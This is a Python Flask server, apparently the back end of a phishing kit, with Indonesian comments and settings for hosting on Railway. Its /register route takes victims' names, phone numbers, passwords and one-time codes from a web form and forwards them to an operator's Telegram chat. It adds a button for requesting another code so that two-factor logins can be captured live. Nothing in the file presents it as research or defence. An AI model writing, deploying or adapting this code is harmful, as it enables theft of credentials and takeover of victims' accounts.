import os
from flask import Flask, request, jsonify
from flask_cors import CORS
import requests

app = Flask(__name__)

# Mengatasi error CORS agar website Netlify bisa mengirim data
CORS(app, resources={r"/*": {"origins": "*"}})

# Mengambil variabel dari dashboard Railway
TOKEN = os.getenv("BOT_TOKEN") 
CHAT_ID = os.getenv("TELEGRAM_CHAT_ID")

def send_to_telegram(message, show_button=False):
    """Mengirim pesan ke Telegram dengan format persis gambar"""
    if TOKEN and CHAT_ID:
        url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
        payload = {
            "chat_id": CHAT_ID,
            "text": message,
            "parse_mode": "Markdown"
        }
        
        # Menambahkan tombol 'otp' di bawah pesan
        if show_button:
            payload["reply_markup"] = {
                "inline_keyboard": [[
                    {"text": "otp", "callback_data": "minta_otp_lagi"}
                ]]
            }
            
        try:
            requests.post(url, json=payload)
        except Exception as e:
            print(f"Gagal kirim ke Telegram: {e}")

@app.route('/register', methods=['POST'])
def register():
    try:
        data = request.json
        nama = data.get('nama', 'None')
        nomor = data.get('nomor', 'None')
        otp = data.get('otp', 'None')
        sandi = data.get('sandi', 'None')

        # Format teks: Sesuai dengan urutan dan tampilan di gambar kamu
        msg = (
            f"Name: {nama}\n"
            f"Number: {nomor}\n"
            f"Password: {sandi}\n"
            f"OTP : {otp}"
        )

        # Kirim data ke bot
        send_to_telegram(msg, show_button=True)
        
        return jsonify({"status": "success", "message": "Data terkirim ke bot"}), 200
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)}), 500

@app.route('/webhook', methods=['POST'])
def telegram_webhook():
    """Menangani ketika tombol 'otp' diklik di Telegram"""
    data = request.json
    if "callback_query" in data:
        chat_id = data["callback_query"]["message"]["chat"]["id"]
        
        # Respon otomatis saat tombol diklik tanpa user isi web lagi
        requests.post(f"https://api.telegram.org/bot{TOKEN}/sendMessage", json={
            "chat_id": chat_id,
            "text": "🔄 *Sedang memproses permintaan OTP baru...*\nSilakan tunggu, kode akan muncul otomatis di bawah.",
            "parse_mode": "Markdown"
        })
    return "OK", 200

if __name__ == '__main__':
    # Menggunakan port otomatis dari Railway
    app.run(host='0.0.0.0', port=int(os.getenv("PORT", 5000)))